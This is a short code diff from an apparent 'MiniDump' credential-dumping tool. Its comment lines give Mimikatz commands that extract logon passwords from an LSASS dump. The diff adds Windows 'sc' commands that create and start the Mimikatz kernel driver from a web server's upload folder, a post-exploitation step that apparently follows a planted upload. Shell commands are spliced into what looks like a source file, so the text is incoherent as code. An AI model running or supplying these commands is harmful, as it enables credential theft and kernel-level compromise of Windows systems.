@@ -134,6 +134,9 @@ namespace MiniDump
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 
+sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
+sc start mimidrv
+
 
 
   
